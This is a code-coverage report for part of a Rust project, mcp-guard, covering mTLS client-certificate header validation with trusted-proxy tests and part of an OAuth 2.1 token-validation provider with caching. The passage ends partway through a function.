  300|      0|                    "Rejecting mTLS headers from untrusted IP"
  301|       |                );
  302|      1|            }
  303|      2|            return None;
  304|      1|        }
  305|       |
  306|      1|        Self::from_headers_unchecked(headers)
  307|      3|    }
  308|       |
  309|       |    /// Create ClientCertInfo from HTTP headers WITHOUT trusted proxy validation
  310|       |    ///
  311|       |    /// # Safety
  312|       |    /// This method does NOT validate the client IP. Only use when:
  313|       |    /// 1. You have already validated the client IP separately
  314|       |    /// 2. In tests with trusted data
  315|       |    /// 3. When TLS is terminated by the same server (no proxy headers)
  316|      3|    pub fn from_headers_unchecked(headers: &axum::http::HeaderMap) -> Option<Self> {
  317|       |        // Check if cert was verified
  318|      3|        let verified = headers
  319|      3|            .get(HEADER_CLIENT_CERT_VERIFIED)
  320|      3|            .and_then(|v| v.to_str().ok())
                                        ^2^2       ^2
  321|      3|            .map(|v| v.eq_ignore_ascii_case("success") || v.eq_ignore_ascii_case("true"))
                                   ^2^2                   ^2            ^0^0                   ^0
  322|      3|            .unwrap_or(false);
  323|       |
  324|       |        // Get CN
  325|      3|        let common_name = headers
  326|      3|            .get(HEADER_CLIENT_CERT_CN)
  327|      3|            .and_then(|v| v.to_str().ok())
                                        ^2^2       ^2
  328|      3|            .map(|s| s.to_string());
                                   ^2^2
  329|       |
  330|       |        // If no CN and not verified, no valid cert info
  331|      3|        if common_name.is_none() && !verified {
                                                  ^1
  332|      1|            return None;
  333|      2|        }
  334|       |
  335|       |        // Get SANs (comma-separated)
  336|      2|        let san_dns = headers
  337|      2|            .get(HEADER_CLIENT_CERT_SAN_DNS)
  338|      2|            .and_then(|v| v.to_str().ok())
                                        ^1^1       ^1
  339|      2|            .map(|s| s.split(',').map(|s| s.trim().to_string()).collect())
                                   ^1^1         ^1                            ^1
  340|      2|            .unwrap_or_default();
  341|       |
  342|      2|        let san_email = headers
  343|      2|            .get(HEADER_CLIENT_CERT_SAN_EMAIL)
  344|      2|            .and_then(|v| v.to_str().ok())
                                        ^0^0       ^0
  345|      2|            .map(|s| s.split(',').map(|s| s.trim().to_string()).collect())
                                   ^0^0         ^0      ^0       ^0           ^0
  346|      2|            .unwrap_or_default();
  347|       |
  348|      2|        Some(ClientCertInfo {
  349|      2|            common_name,
  350|      2|            san_dns,
  351|      2|            san_email,
  352|      2|            verified,
  353|      2|        })
  354|      3|    }
  355|       |}
  356|       |
  357|       |#[cfg(test)]
  358|       |mod tests {
  359|       |    use super::*;
  360|       |    use axum::http::HeaderMap;
  361|       |
  362|       |    #[test]
  363|      1|    fn test_mtls_provider_creation() {
  364|      1|        let config = MtlsConfig {
  365|      1|            enabled: true,
  366|      1|            identity_source: MtlsIdentitySource::Cn,
  367|      1|            allowed_tools: vec!["read_file".to_string()],
  368|      1|            rate_limit: Some(100),
  369|      1|            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
  370|      1|        };
  371|       |
  372|      1|        let provider = MtlsAuthProvider::new(config);
  373|      1|        assert_eq!(provider.name(), "mtls");
  374|      1|        assert!(provider.has_trusted_proxies());
  375|      1|    }
  376|       |
  377|       |    // --------------------------------------------------------------------------
  378|       |    // Trusted Proxy Validation Tests
  379|       |    // --------------------------------------------------------------------------
  380|       |
  381|       |    #[test]
  382|      1|    fn test_trusted_proxy_single_ip() {
  383|      1|        let validator = TrustedProxyValidator::new(&[
  384|      1|            "10.0.0.1".to_string(),
  385|      1|            "192.168.1.100".to_string(),
  386|      1|        ]);
  387|       |
  388|      1|        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
  389|      1|        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
  390|      1|        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
  391|      1|        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
  392|      1|    }
  393|       |
  394|       |    #[test]
  395|      1|    fn test_trusted_proxy_cidr() {
  396|      1|        let validator = TrustedProxyValidator::new(&[
  397|      1|            "10.0.0.0/8".to_string(),
  398|      1|            "192.168.0.0/16".to_string(),
  399|      1|        ]);
  400|       |
  401|       |        // Should match 10.x.x.x
  402|      1|        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
  403|      1|        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));
  404|       |
  405|       |        // Should match 192.168.x.x
  406|      1|        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
  407|      1|        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));
  408|       |
  409|       |        // Should not match others
  410|      1|        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
  411|      1|        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
  412|      1|    }
  413|       |
  414|       |    #[test]
  415|      1|    fn test_trusted_proxy_empty_rejects_all() {
  416|      1|        let validator = TrustedProxyValidator::new(&[]);
  417|       |
  418|       |        // Empty config should reject all IPs
  419|      1|        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
  420|      1|        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
  421|      1|        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
  422|      1|    }
  423|       |
  424|       |    #[test]
  425|      1|    fn test_trusted_proxy_ipv6() {
  426|      1|        let validator = TrustedProxyValidator::new(&[
  427|      1|            "::1".to_string(),
  428|      1|            "fd00::/8".to_string(),
  429|      1|        ]);
  430|       |
  431|      1|        assert!(validator.is_trusted(&"::1".parse().unwrap()));
  432|      1|        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
  433|      1|        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
  434|      1|    }
  435|       |
  436|       |    #[test]
  437|      1|    fn test_from_headers_if_trusted_accepts_trusted() {
  438|      1|        let config = MtlsConfig {
  439|      1|            enabled: true,
  440|      1|            identity_source: MtlsIdentitySource::Cn,
  441|      1|            allowed_tools: vec![],
  442|      1|            rate_limit: None,
  443|      1|            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
  444|      1|        };
  445|      1|        let provider = MtlsAuthProvider::new(config);
  446|       |
  447|      1|        let mut headers = HeaderMap::new();
  448|      1|        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
  449|      1|        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());
  450|       |
  451|      1|        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
  452|      1|        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);
  453|       |
  454|      1|        assert!(cert_info.is_some());
  455|      1|        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
  456|      1|    }
  457|       |
  458|       |    #[test]
  459|      1|    fn test_from_headers_if_trusted_rejects_untrusted() {
  460|      1|        let config = MtlsConfig {
  461|      1|            enabled: true,
  462|      1|            identity_source: MtlsIdentitySource::Cn,
  463|      1|            allowed_tools: vec![],
  464|      1|            rate_limit: None,
  465|      1|            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
  466|      1|        };
  467|      1|        let provider = MtlsAuthProvider::new(config);
  468|       |
  469|      1|        let mut headers = HeaderMap::new();
  470|      1|        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
  471|      1|        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());
  472|       |
  473|       |        // Attacker IP not in trusted list
  474|      1|        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
  475|      1|        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);
  476|       |
  477|      1|        assert!(cert_info.is_none()); // Headers should be rejected
  478|      1|    }
  479|       |
  480|       |    #[test]
  481|      1|    fn test_from_headers_if_trusted_rejects_when_no_trusted_configured() {
  482|      1|        let config = MtlsConfig {
  483|      1|            enabled: true,
  484|      1|            identity_source: MtlsIdentitySource::Cn,
  485|      1|            allowed_tools: vec![],
  486|      1|            rate_limit: None,
  487|      1|            trusted_proxy_ips: vec![], // No trusted IPs!
  488|      1|        };
  489|      1|        let provider = MtlsAuthProvider::new(config);
  490|       |
  491|      1|        let mut headers = HeaderMap::new();
  492|      1|        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
  493|      1|        headers.insert(HEADER_CLIENT_CERT_CN, "any-client".parse().unwrap());
  494|       |
  495|       |        // Even localhost should be rejected
  496|      1|        let localhost: IpAddr = "127.0.0.1".parse().unwrap();
  497|      1|        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &localhost, &provider);
  498|       |
  499|      1|        assert!(cert_info.is_none()); // No trusted proxies = reject all header auth
  500|      1|    }
  501|       |
  502|       |    // --------------------------------------------------------------------------
  503|       |    // Existing Tests (updated to use from_headers_unchecked)
  504|       |    // --------------------------------------------------------------------------
  505|       |
  506|       |    #[test]
  507|      1|    fn test_extract_identity_from_cn() {
  508|      1|        let config = MtlsConfig {
  509|      1|            enabled: true,
  510|      1|            identity_source: MtlsIdentitySource::Cn,
  511|      1|            allowed_tools: vec![],
  512|      1|            rate_limit: None,
  513|      1|            trusted_proxy_ips: vec![],
  514|      1|        };
  515|       |
  516|      1|        let provider = MtlsAuthProvider::new(config);
  517|      1|        let cert_info = ClientCertInfo {
  518|      1|            common_name: Some("service-client".to_string()),
  519|      1|            san_dns: vec!["client.example.com".to_string()],
  520|      1|            san_email: vec![],
  521|      1|            verified: true,
  522|      1|        };
  523|       |
  524|      1|        let identity = provider.extract_identity(&cert_info).unwrap();
  525|      1|        assert_eq!(identity.id, "service-client");
  526|      1|        assert_eq!(identity.name, Some("service-client".to_string()));
  527|      1|        assert!(identity.allowed_tools.is_none());
  528|      1|    }
  529|       |
  530|       |    #[test]
  531|      1|    fn test_extract_identity_from_san_dns() {
  532|      1|        let config = MtlsConfig {
  533|      1|            enabled: true,
  534|      1|            identity_source: MtlsIdentitySource::SanDns,
  535|      1|            allowed_tools: vec!["read_file".to_string()],
  536|      1|            rate_limit: Some(50),
  537|      1|            trusted_proxy_ips: vec![],
  538|      1|        };
  539|       |
  540|      1|        let provider = MtlsAuthProvider::new(config);
  541|      1|        let cert_info = ClientCertInfo {
  542|      1|            common_name: Some("service-client".to_string()),
  543|      1|            san_dns: vec!["client.example.com".to_string()],
  544|      1|            san_email: vec![],
  545|      1|            verified: true,
  546|      1|        };
  547|       |
  548|      1|        let identity = provider.extract_identity(&cert_info).unwrap();
  549|      1|        assert_eq!(identity.id, "client.example.com");
  550|      1|        assert_eq!(identity.allowed_tools, Some(vec!["read_file".to_string()]));
  551|      1|        assert_eq!(identity.rate_limit, Some(50));
  552|      1|    }
  553|       |
  554|       |    #[test]
  555|      1|    fn test_extract_identity_missing_cn() {
  556|      1|        let config = MtlsConfig {
  557|      1|            enabled: true,
  558|      1|            identity_source: MtlsIdentitySource::Cn,
  559|      1|            allowed_tools: vec![],
  560|      1|            rate_limit: None,
  561|      1|            trusted_proxy_ips: vec![],
  562|      1|        };
  563|       |
  564|      1|        let provider = MtlsAuthProvider::new(config);
  565|      1|        let cert_info = ClientCertInfo {
  566|      1|            common_name: None,
  567|      1|            san_dns: vec!["client.example.com".to_string()],
  568|      1|            san_email: vec![],
  569|      1|            verified: true,
  570|      1|        };
  571|       |
  572|      1|        let result = provider.extract_identity(&cert_info);
  573|      1|        assert!(result.is_err());
  574|      1|    }
  575|       |
  576|       |    #[test]
  577|      1|    fn test_client_cert_info_from_headers() {
  578|      1|        let mut headers = HeaderMap::new();
  579|      1|        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
  580|      1|        headers.insert(HEADER_CLIENT_CERT_CN, "my-service".parse().unwrap());
  581|      1|        headers.insert(
  582|       |            HEADER_CLIENT_CERT_SAN_DNS,
  583|      1|            "service.example.com, api.example.com".parse().unwrap(),
  584|       |        );
  585|       |
  586|      1|        let cert_info = ClientCertInfo::from_headers_unchecked(&headers).unwrap();
  587|      1|        assert_eq!(cert_info.common_name, Some("my-service".to_string()));
  588|      1|        assert!(cert_info.verified);
  589|      1|        assert_eq!(cert_info.san_dns.len(), 2);
  590|      1|        assert_eq!(cert_info.san_dns[0], "service.example.com");
  591|      1|        assert_eq!(cert_info.san_dns[1], "api.example.com");
  592|      1|    }
  593|       |
  594|       |    #[test]
  595|      1|    fn test_client_cert_info_from_headers_not_verified() {
  596|      1|        let headers = HeaderMap::new();
  597|       |
  598|      1|        let cert_info = ClientCertInfo::from_headers_unchecked(&headers);
  599|      1|        assert!(cert_info.is_none());
  600|      1|    }
  601|       |
  602|       |    #[tokio::test]
  603|      1|    async fn test_authenticate_with_cn_token() {
  604|      1|        let config = MtlsConfig {
  605|      1|            enabled: true,
  606|      1|            identity_source: MtlsIdentitySource::Cn,
  607|      1|            allowed_tools: vec![],
  608|      1|            rate_limit: None,
  609|      1|            trusted_proxy_ips: vec![],
  610|      1|        };
  611|       |
  612|      1|        let provider = MtlsAuthProvider::new(config);
  613|      1|        let identity = provider.authenticate("my-client-cn").await.unwrap();
  614|      1|        assert_eq!(identity.id, "my-client-cn");
  615|      1|    }
  616|       |
  617|       |    #[tokio::test]
  618|      1|    async fn test_authenticate_empty_token() {
  619|      1|        let config = MtlsConfig::default();
  620|      1|        let provider = MtlsAuthProvider::new(config);
  621|      1|        let result = provider.authenticate("").await;
  622|      1|        assert!(result.is_err());
  623|      1|    }
  624|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/auth/oauth.rs:
    1|       |//! OAuth 2.1 authentication provider for mcp-guard
    2|       |//!
    3|       |//! Supports multiple OAuth providers with token validation via:
    4|       |//! - Token introspection (RFC 7662) for opaque tokens
    5|       |//! - UserInfo endpoint as fallback
    6|       |
    7|       |use async_trait::async_trait;
    8|       |use std::collections::HashMap;
    9|       |use std::sync::Arc;
   10|       |use std::time::{Duration, Instant};
   11|       |use tokio::sync::RwLock;
   12|       |
   13|       |use crate::auth::{map_scopes_to_tools, AuthError, AuthProvider, Identity};
   14|       |use crate::config::{OAuthConfig, OAuthProvider as OAuthProviderType};
   15|       |
   16|       |/// Well-known OAuth provider endpoints
   17|       |struct ProviderEndpoints {
   18|       |    authorization_url: &'static str,
   19|       |    token_url: &'static str,
   20|       |    userinfo_url: &'static str,
   21|       |    introspection_url: Option<&'static str>,
   22|       |}
   23|       |
   24|       |impl ProviderEndpoints {
   25|     25|    fn for_provider(provider: &OAuthProviderType) -> Option<Self> {
   26|     25|        match provider {
   27|     12|            OAuthProviderType::GitHub => Some(Self {
   28|     12|                authorization_url: "https://github.com/login/oauth/authorize",
   29|     12|                token_url: "https://github.com/login/oauth/access_token",
   30|     12|                userinfo_url: "https://api.github.com/user",
   31|     12|                introspection_url: None, // GitHub doesn't support introspection
   32|     12|            }),
   33|      0|            OAuthProviderType::Google => Some(Self {
   34|      0|                authorization_url: "https://accounts.google.com/o/oauth2/v2/auth",
   35|      0|                token_url: "https://oauth2.googleapis.com/token",
   36|      0|                userinfo_url: "https://openidconnect.googleapis.com/v1/userinfo",
   37|      0|                introspection_url: Some("https://oauth2.googleapis.com/tokeninfo"),
   38|      0|            }),
   39|      0|            OAuthProviderType::Okta => None, // Requires tenant-specific URLs
   40|     13|            OAuthProviderType::Custom => None,
   41|       |        }
   42|     25|    }
   43|       |}
   44|       |
   45|       |/// Token info from introspection or userinfo response
   46|       |#[derive(Debug, Clone, Default)]
   47|       |struct TokenInfo {
   48|       |    active: bool,
   49|       |    user_id: Option<String>,
   50|       |    username: Option<String>,
   51|       |    scopes: Vec<String>,
   52|       |    expires_at: Option<i64>,
   53|       |    claims: HashMap<String, serde_json::Value>,
   54|       |}
   55|       |
   56|       |/// Token cache duration for validated tokens.
   57|       |/// 5 minutes reduces introspection calls while ensuring revoked tokens
   58|       |/// are detected within an acceptable window.
   59|       |const TOKEN_CACHE_DURATION_SECS: u64 = 300;
   60|       |
   61|       |/// HTTP request timeout for OAuth provider calls.
   62|       |/// 10 seconds is generous for OAuth providers but prevents indefinite hangs
   63|       |/// on network issues.
   64|       |const HTTP_REQUEST_TIMEOUT_SECS: u64 = 10;
   65|       |
   66|       |/// Cache entry count triggering cleanup of expired entries.
   67|       |/// At 100 entries we scan for expired tokens to maintain fast lookups.
   68|       |const CACHE_CLEANUP_THRESHOLD: usize = 100;
   69|       |
   70|       |/// Maximum cache entries (hard limit) with LRU eviction.
   71|       |/// 500 entries bounds memory usage (~50KB) while supporting high concurrency.
   72|       |/// When exceeded, oldest 50 entries are removed.
   73|       |const CACHE_MAX_ENTRIES: usize = 500;
   74|       |
   75|       |/// Cached token info to avoid repeated introspection calls
   76|       |struct TokenCache {
   77|       |    entries: HashMap<String, CachedToken>,
   78|       |    cache_duration: Duration,
   79|       |    insert_count: usize, // Track inserts for periodic cleanup
   80|       |}
   81|       |
   82|       |struct CachedToken {
   83|       |    info: TokenInfo,
   84|       |    cached_at: Instant,
   85|       |}
   86|       |
   87|       |impl TokenCache {
   88|     24|    fn new(cache_duration: Duration) -> Self {
   89|     24|        Self {
   90|     24|            entries: HashMap::new(),
   91|     24|            cache_duration,
   92|     24|            insert_count: 0,
   93|     24|        }
   94|     24|    }
   95|       |
   96|     15|    fn get(&self, token_hash: &str) -> Option<&TokenInfo> {
   97|     15|        self.entries.get(token_hash).and_then(|cached| {
                                                                     ^2
   98|      2|            if cached.cached_at.elapsed() < self.cache_duration {
   99|      2|                Some(&cached.info)
  100|       |            } else {
  101|      0|                None
  102|       |            }
  103|      2|        })
  104|     15|    }
  105|       |
  106|     11|    fn insert(&mut self, token_hash: String, info: TokenInfo) {
  107|     11|        self.entries.insert(
  108|     11|            token_hash,
  109|     11|            CachedToken {
  110|     11|                info,
  111|     11|                cached_at: Instant::now(),
  112|     11|            },
  113|       |        );
  114|     11|        self.insert_count += 1;
  115|       |
  116|       |        // Periodic cleanup based on insert count
  117|     11|        if self.insert_count >= CACHE_CLEANUP_THRESHOLD {
  118|      0|            self.cleanup_expired();
  119|      0|            self.insert_count = 0;
  120|     11|        }
  121|       |
  122|       |        // Hard limit - if still too many entries, remove oldest
  123|     11|        if self.entries.len() > CACHE_MAX_ENTRIES {
  124|      0|            self.evict_oldest();
  125|     11|        }
  126|     11|    }
  127|       |
  128|      0|    fn cleanup_expired(&mut self) {
  129|      0|        let before = self.entries.len();
  130|      0|        self.entries
  131|      0|            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
  132|      0|        let removed = before - self.entries.len();
  133|      0|        if removed > 0 {
  134|      0|            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
  135|      0|        }
  136|      0|    }
  137|       |
  138|       |    /// Remove oldest entries to enforce hard limit
  139|      0|    fn evict_oldest(&mut self) {
  140|       |        // Collect entries with their ages
  141|      0|        let mut entries: Vec<_> = self
  142|      0|            .entries
  143|      0|            .iter()
  144|      0|            .map(|(k, v)| (k.clone(), v.cached_at))
  145|      0|            .collect();
  146|       |
  147|       |        // Sort by age (oldest first)
  148|      0|        entries.sort_by(|a, b| a.1.cmp(&b.1));
  149|       |
  150|       |        // Remove oldest entries until we're under the limit
  151|      0|        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
  152|      0|        for (key, _) in entries.into_iter().take(to_remove) {
  153|      0|            self.entries.remove(&key);
  154|      0|        }
  155|       |
  156|      0|        tracing::debug!(
  157|       |            removed = to_remove,
  158|      0|            remaining = self.entries.len(),
  159|      0|            "Token cache evicted oldest entries"
  160|       |        );
  161|      0|    }
  162|       |}
  163|       |
  164|       |/// OAuth 2.1 authentication provider
  165|       |pub struct OAuthAuthProvider {
  166|       |    config: OAuthConfig,
  167|       |    authorization_url: String,
  168|       |    token_url: String,
  169|       |    userinfo_url: String,
  170|       |    introspection_url: Option<String>,
  171|       |    http_client: reqwest::Client,
  172|       |    token_cache: Arc<RwLock<TokenCache>>,
  173|       |}
  174|       |
  175|       |impl OAuthAuthProvider {
  176|       |    /// Create a new OAuth provider from configuration
  177|     25|    pub fn new(config: OAuthConfig) -> Result<Self, AuthError> {
  178|       |        // Resolve endpoints from provider type or config
  179|     25|        let endpoints = ProviderEndpoints::for_provider(&config.provider);
  180|       |
  181|     25|        let authorization_url = config
                          ^24
  182|     25|            .authorization_url
  183|     25|            .clone()
  184|     25|            .or_else(|| endpoints.as_ref().map(|e| e.authorization_url.to_string()))
                                      ^13       ^13      ^13     ^12                 ^12
  185|     25|            .ok_or_else(|| {
                                         ^1
  186|      1|                AuthError::OAuth("authorization_url required for this provider".into())
  187|      1|            })?;
  188|       |
  189|     24|        let token_url = config
  190|     24|            .token_url
  191|     24|            .clone()
  192|     24|            .or_else(|| endpoints.as_ref().map(|e| e.token_url.to_string()))
                                      ^12       ^12      ^12     ^12         ^12
  193|     24|            .ok_or_else(|| AuthError::OAuth("token_url required for this provider".into()))?;
                                                          ^0                                     ^0      ^0
  194|       |
  195|     24|        let userinfo_url = config
  196|     24|            .userinfo_url
  197|     24|            .clone()
  198|     24|            .or_else(|| endpoints.as_ref().map(|e| e.userinfo_url.to_string()))
                                      ^12       ^12      ^12     ^12            ^12
  199|     24|            .ok_or_else(|| AuthError::OAuth("userinfo_url required for this provider".into()))?;
                                                          ^0                                        ^0      ^0
  200|       |
  201|     24|        let introspection_url = config
  202|     24|            .introspection_url
  203|     24|            .clone()
  204|     24|            .or_else(|| endpoints.as_ref().and_then(|e| e.introspection_url.map(String::from)));
                                      ^16       ^16      ^16          ^12                 ^12
  205|       |
  206|     24|        let http_client = reqwest::Client::builder()
  207|     24|            .timeout(Duration::from_secs(HTTP_REQUEST_TIMEOUT_SECS))
  208|     24|            .build()
  209|     24|            .map_err(|e| AuthError::Internal(format!("Failed to create HTTP client: {}", e)))?;
                                                           ^0      ^0                                      ^0
  210|       |
  211|       |        // Cache tokens for 5 minutes by default
  212|     24|        let token_cache = Arc::new(RwLock::new(TokenCache::new(Duration::from_secs(TOKEN_CACHE_DURATION_SECS))));
  213|       |
  214|     24|        Ok(Self {
  215|     24|            config,
  216|     24|            authorization_url,
  217|     24|            token_url,
  218|     24|            userinfo_url,
  219|     24|            introspection_url,
  220|     24|            http_client,
  221|     24|            token_cache,
  222|     24|        })
  223|     25|    }
  224|       |
  225|       |    /// Get the authorization URL for initiating OAuth flow
  226|      3|    pub fn get_authorization_url(&self, state: &str, code_challenge: Option<&str>) -> String {
  227|      3|        let mut url = format!(
  228|      3|            "{}?response_type=code&client_id={}&redirect_uri={}&scope={}&state={}",
  229|       |            self.authorization_url,
  230|      3|            urlencoding::encode(&self.config.client_id),
  231|      3|            urlencoding::encode(&self.config.redirect_uri),
  232|      3|            urlencoding::encode(&self.config.scopes.join(" ")),
  233|      3|            urlencoding::encode(state)
  234|       |        );
  235|       |
  236|       |        // Add PKCE code_challenge if provided (OAuth 2.1 requires PKCE)
  237|      3|        if let Some(challenge) = code_challenge {
                                  ^2
  238|      2|            url.push_str(&format!(
  239|      2|                "&code_challenge={}&code_challenge_method=S256",
  240|      2|                urlencoding::encode(challenge)
  241|      2|            ));
  242|      2|        }
                      ^1
  243|       |
  244|      3|        url
  245|      3|    }
  246|       |
  247|       |    /// Get the token URL for reference
  248|      0|    pub fn token_url(&self) -> &str {
  249|      0|        &self.token_url
  250|      0|    }
  251|       |
  252|       |    /// Hash a token for cache key (don't store raw tokens)
  253|     18|    fn hash_token(token: &str) -> String {
  254|       |        use sha2::{Digest, Sha256};
  255|     18|        let mut hasher = Sha256::new();
  256|     18|        hasher.update(token.as_bytes());
  257|     18|        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
  258|     18|    }
  259|       |
  260|       |    /// Validate token via introspection endpoint (RFC 7662)
  261|      9|    async fn introspect_token(&self, token: &str) -> Result<TokenInfo, AuthError> {
  262|      9|        let introspection_url = self
  263|      9|            .introspection_url
  264|      9|            .as_ref()
  265|      9|            .ok_or_else(|| AuthError::OAuth("No introspection endpoint configured".into()))?;
                                                          ^0                                     ^0      ^0
  266|       |
  267|      9|        let mut request = self
  268|      9|            .http_client
  269|      9|            .post(introspection_url)
  270|      9|            .form(&[("token", token)]);
  271|       |
  272|       |        // Add client credentials if available
  273|      9|        if let Some(ref secret) = self.config.client_secret {
  274|      9|            request = request.basic_auth(&self.config.client_id, Some(secret));
  275|      9|        }
                      ^0
  276|       |
  277|      9|        let response = request
  278|      9|            .send()
  279|      9|            .await
  280|      9|            .map_err(|e| AuthError::OAuth(format!("Introspection request failed: {}", e)))?;
                                                        ^0      ^0                                      ^0
  281|       |
  282|      9|        if !response.status().is_success() {
  283|      1|            return Err(AuthError::OAuth(format!(
  284|      1|                "Introspection endpoint returned {}",
  285|      1|                response.status()
  286|      1|            )));
  287|      8|        }
  288|       |
  289|      8|        let body: serde_json::Value = response
  290|      8|            .json()
  291|      8|            .await
  292|      8|            .map_err(|e| AuthError::OAuth(format!("Failed to parse introspection response: {}", e)))?;
                                                        ^0      ^0                                                ^0
  293|       |
  294|      8|        self.parse_token_info(&body)
  295|      9|    }
  296|       |
  297|       |    /// Validate token via userinfo endpoint
  298|      5|    async fn get_userinfo(&self, token: &str) -> Result<TokenInfo, AuthError> {
  299|      5|        let response = self
  300|      5|            .http_client
  301|      5|            .get(&self.userinfo_url)
  302|      5|            .bearer_auth(token)
  303|      5|            .header("Accept", "application/json")
  304|      5|            .send()
  305|      5|            .await
  306|      5|            .map_err(|e| AuthError::OAuth(format!("UserInfo request failed: {}", e)))?;
                                                        ^0      ^0                                 ^0
  307|       |
  308|      5|        if response.status() == reqwest::StatusCode::UNAUTHORIZED {
  309|      1|            return Err(AuthError::TokenExpired);
  310|      4|        }
  311|       |
  312|      4|        if !response.status().is_success() {
  313|      1|            return Err(AuthError::OAuth(format!(
  314|      1|                "UserInfo endpoint returned {}",
  315|      1|                response.status()
  316|      1|            )));
  317|      3|        }
  318|       |
  319|      3|        let body: serde_json::Value = response
  320|      3|            .json()
  321|      3|            .await
  322|      3|            .map_err(|e| AuthError::OAuth(format!("Failed to parse userinfo response: {}", e)))?;
                                                        ^0      ^0                                           ^0
  323|       |
  324|       |        // UserInfo doesn't have "active" field, so we assume active if we got a response
  325|      3|        let mut info = self.parse_token_info(&body)?;
                                                                 ^0
  326|      3|        info.active = true;
  327|      3|        Ok(info)
  328|      5|    }
  329|       |
  330|       |    /// Parse token info from JSON response (works for both introspection and userinfo)
  331|     14|    fn parse_token_info(&self, body: &serde_json::Value) -> Result<TokenInfo, AuthError> {
  332|     14|        let active = body.get("active").and_then(|v| v.as_bool()).unwrap_or(true);
                                                                   ^10^10
  333|       |
  334|     14|        if !active {
  335|      2|            return Ok(TokenInfo {
  336|      2|                active: false,
  337|      2|                ..Default::default()
  338|      2|            });
  339|     12|        }
  340|       |
  341|       |        // Extract user ID from configured claim
  342|     12|        let user_id = body
  343|     12|            .get(&self.config.user_id_claim)
  344|     12|            .and_then(|v| v.as_str())
                                        ^10^10
  345|     12|            .map(String::from)
  346|     12|            .or_else(|| body.get("sub").and_then(|v| v.as_str()).map(String::from))
                                      ^2   ^2         ^2           ^0^0        ^2
  347|     12|            .or_else(|| {
                                      ^2
  348|       |                // GitHub returns "id" as a number
  349|      2|                body.get("id").and_then(|v| v.as_i64()).map(|id| id.to_string())
  350|      2|            })
  351|     12|            .or_else(|| body.get("id").and_then(|v| v.as_str()).map(String::from));
                                      ^0   ^0        ^0           ^0^0        ^0
  352|       |
  353|       |        // Extract username/name
  354|     12|        let username = body
  355|     12|            .get("username")
  356|     12|            .or_else(|| body.get("name"))
                                      ^9   ^9
  357|     12|            .or_else(|| body.get("login")) // GitHub
                                      ^5   ^5
  358|     12|            .and_then(|v| v.as_str())
                                        ^7^7
  359|     12|            .map(String::from);
  360|       |
  361|       |        // Extract scopes
  362|     12|        let scopes = body
  363|     12|            .get("scope")
  364|     12|            .map(|v| match v {
                                         ^4
  365|      4|                serde_json::Value::String(s) => s.split_whitespace().map(String::from).collect(),
  366|      0|                serde_json::Value::Array(arr) => arr
  367|      0|                    .iter()
  368|      0|                    .filter_map(|v| v.as_str())
  369|      0|                    .map(String::from)
  370|      0|                    .collect(),
  371|      0|                _ => vec![],
  372|      4|            })
  373|     12|            .unwrap_or_default();
  374|       |
  375|       |        // Extract expiration
  376|     12|        let expires_at = body.get("exp").and_then(|v| v.as_i64());
                                                                    ^1^1
  377|       |
  378|       |        // Convert body to claims map
  379|     12|        let claims = body
  380|     12|            .as_object()
  381|     12|            .map(|obj| {
  382|     12|                obj.iter()
  383|     34|                    .map(|(k, v)| (k.clone(), v.clone()))
                                   ^12
  384|     12|                    .collect()
  385|     12|            })
  386|     12|            .unwrap_or_default();
  387|       |
  388|     12|        Ok(TokenInfo {
  389|     12|            active: true,
  390|     12|            user_id,
  391|     12|            username,
  392|     12|            scopes,
  393|     12|            expires_at,
  394|     12|            claims,
  395|     12|        })
  396|     14|    }
  397|       |
  398|       |    /// Validate token and return info (with caching)
  399|     15|    async fn validate_token(&self, token: &str) -> Result<TokenInfo, AuthError> {
  400|     15|        let token_hash = Self::hash_token(token);
  401|       |
  402|       |        // Check cache first
  403|       |        {
  404|     15|            let cache = self.token_cache.read().await;
  405|     15|            if let Some(info) = cache.get(&token_hash) {
                                      ^2
  406|      2|                if info.active {
  407|      2|                    return Ok(info.clone());
  408|       |                } else {
  409|      0|                    return Err(AuthError::TokenExpired);
  410|       |                }
  411|     13|            }
  412|       |        }
  413|       |
  414|       |        // Try introspection first, fall back to userinfo
  415|     13|        let info = if self.introspection_url.is_some() {
                          ^11
  416|      9|            match self.introspect_token(token).await {
  417|      8|                Ok(info) => info,
  418|      1|                Err(_) => self.get_userinfo(token).await?,
                                                                      ^0
  419|       |            }
  420|       |        } else {
